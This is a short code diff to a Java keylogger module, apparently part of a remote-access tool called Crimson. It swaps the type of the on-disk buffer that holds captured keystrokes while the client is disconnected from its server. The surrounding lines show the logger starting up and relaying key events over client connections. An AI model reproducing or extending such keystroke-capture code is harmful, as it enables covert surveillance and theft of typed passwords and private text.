@@ -29,12 +29,12 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.net.ClientConnectionStore;
-import com.subterranean_security.crimson.core.misc.MemList;
 import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.store.ConnectionStore;
+import com.subterranean_security.crimson.core.struct.collections.cached.CachedList;
 import com.subterranean_security.crimson.core.util.Native;
 import com.subterranean_security.crimson.universal.stores.DatabaseStore;
 
@@ -53,7 +53,7 @@ public final class Keylogger {
 	/**
 	 * Keybuffer that stores results persistently if server is not connected
 	 */
-	private static MemList<EV_KEvent> diskBuffer = null;
+	private static CachedList<EV_KEvent> diskBuffer = null;
 
 	/**
 	 * Thread that monitors the keybuffer for changes
@@ -82,7 +82,7 @@ public final class Keylogger {
 		log.info("Starting keylogger");
 
 		try {
-			diskBuffer = (MemList<EV_KEvent>) DatabaseStore.getDatabase().getObject("keylogger.buffer");
+			diskBuffer = (CachedList<EV_KEvent>) DatabaseStore.getDatabase().getObject("keylogger.buffer");
 			diskBuffer.setDatabase(DatabaseStore.getDatabase());
 		} catch (Exception e) {
 			log.error("Failed to initialize persistent key buffer");
